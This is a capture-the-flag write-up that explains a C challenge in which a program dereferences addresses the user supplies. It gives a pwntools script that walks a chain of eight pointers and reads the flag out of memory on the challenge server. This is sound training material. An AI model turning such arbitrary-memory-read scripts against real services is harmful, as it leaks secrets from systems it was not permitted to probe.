# Reconnaissance
## C Review
Opening up the c file immediately we see a lot of pointers. I guess the name makes sense. The code is declaring a chain of 8 pointers to a variable called `x` which has a copy of the flag string in it. The `main()` function defines this and a bunch of pointers, then gives us the address to the last pointer in the chain, furthest from our target `x`. Then, it starts taking user input, passing the hex address we provide in to a function called `examine()`. What does that function do?  

`examine()` takes parameter `p` (our input) and prints out the value of `p`, an address, and `*p`, the dereferenced value of our address. This means that by passing the address of pointer `x8` which the program gave us, we will get the value of the pointer. In other words, we will get the next link in the chain of pointers. By following this chain, we can get to the actual address of `x` and start reading it's hex value!

# Script
```{python}
from pwn import *

context.log_level = "DEBUG"
```
Here we are doing a couple of things. We are importing the `pwn` library to use as our primary tool. Then we set up `pwn` with `context.log_level = "DEBUG"` because this will give us verbose information about what we send and recieve with `pwn`.

Next, we connect and iterate through all of the pointers until we get the address of `x`:
```{python}
io = remote('pointers.pwn.osucyber.club', 13393)
# Grab the starting address for the pointers
io.recvuntil(b'Here\'s a good starting point: ')
address = io.recvline()[:-1]

# Iterate through the addresses of each of the pointers, finding the next one each time
for i in range(8):
    io.recvuntil(b'> ')
    io.send(address+b'\n')
    io.recvuntil(b'] = ')
    address = io.recvline()[:-1]
```
We initialize the `io` variable by creating a remote connection to the challenge server, then read the address of `x8` which they give us to start. Then we iterate through the prompting 8 times to get through the 8 pointers the server has, so that at the end of this loop, the value of `address` should be the address of `x`.

Now, we iterate through the bytes after the address of flag. We don't know how long it is so I went for a generous 80 bytes. If this didn't give the whole flag, we could always change it to more later. The function reads us 8 bytes at a time so I loop through 10 times, reading 8 bytes further in memory each time.
```{python}
flag = b''
flag_address = int(address, 16)
for i in range(10):
    io.recvuntil(b'> ')
    io.send(hex(flag_address+8*i)+'\n')
    io.recvuntil(b'] = ')
    contents = io.recvline()[:-1]
    flag += p64(int(contents, 16))
io.close()

flag = flag.decode()
flag = flag[:flag.find('}')+1]

print(flag)
```
The line above where we use the `find()` method on `flag` searching for the end of the flag isn't necessary. If we didn't read enough memory, then we wouldn't find a right brace to end the flag, and this would give us an issue. I added this after finding the flag to make the program output look nicer.